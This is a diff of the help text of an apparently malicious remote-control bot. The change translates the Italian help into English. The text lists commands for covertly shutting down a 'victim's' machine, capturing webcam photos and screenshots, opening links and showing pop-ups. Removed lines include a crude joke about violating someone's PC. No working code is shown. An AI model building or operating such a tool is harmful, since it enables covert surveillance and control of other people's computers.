@@ -20,40 +20,30 @@ USERPROFILE = getenv("USERPROFILE")
 OWNER = 0
 
 help_ = """
-Ciao peppino, dove vedi <> non vuol dire che il testo lo devvi mettere tra <>
-ma è solo per bellezza, divertiti ad stuprare il pc di sort
+Hi Peppino, theese are all the commands that you need.
+Remember to follow me on github.com/Ricc4rdo0107, enjoy :D.
 
-Dove vedi "###########################" vuol dire che se li esegui spegnerai il bot
-senza possibilità di riconnetterti subito.
+/stop : disconnect the bot.
 
+/spegni : shuts down the machine
 
+/spegnimsg <text> : shuts down the machine with a message.
 
-###########################
-/stop
+/fakespegni : fake shutdown for 5 seconds.
 
-/spegni
+/msg <message> : creates a window pop-up with a custom message.
 
-/spegnimsg <testo>
-###########################
+/rickroll : open the stupid song.
 
-/fakespegni : fa finta di spegnersi
+/link <url> : open a link in the browser.
 
-/msg <messaggio> : crea una vignetta con messaggio personalizzato
+/selphie : sends you a picture from victim's webcam.
 
-/spammsg <messaggio> <numero vignette>: spam di vignette di numero definito con messaggio personalizzato,
-ATTENZIONE POTREBBE CAUSARE IL CRASH DEL PROGRAMMA E CON ESSO LA DISCONNESSIONE DAL BOT!!!!!!!! ( non si sovrappongono per qualche motivo )
+/screenshot : sends you a screenshot from victim's macine.
 
-/rickroll : apri la canzoncina stupida
+/ALTF4 : you can imagine.
 
-/link <url> : apri in link nel browser
-
-/selphie : ti manda na foto dalla webcam
-
-/screenshot : ti si incula lo schermo
-
-/ALTF4 : puoi immaginare
-
-*mandare una foto* : creera un pop-up con la foto, l'ho aggiustato ora puoi stare tranquillo
+*send a picture* : create an alert pop-up with the picture that you sent.
 """
 
 
